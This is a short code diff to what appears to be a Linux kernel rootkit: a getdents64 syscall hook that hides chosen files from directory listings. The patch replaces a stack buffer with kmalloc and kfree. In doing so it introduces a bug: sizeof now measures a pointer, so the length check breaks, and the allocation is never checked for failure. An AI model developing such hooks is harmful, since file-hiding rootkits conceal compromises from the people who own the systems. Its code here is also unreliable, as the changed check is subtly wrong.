@@ -215,7 +215,7 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs) {
         // Build full path to be more precise than before
         bool hide = false;
         if (dirstr) {
-            char fullpath[1024];
+            char *fullpath = kmalloc(PATH_MAX, GFP_KERNEL);
             int len;
 
             if (strcmp(dirstr, "/") == 0) {
@@ -227,6 +227,8 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs) {
 
             if (len > 0 && len < sizeof(fullpath) && is_hidden(fullpath))
                 hide = true;
+				
+			kfree(fullpath);
         }
 
         if (hide)
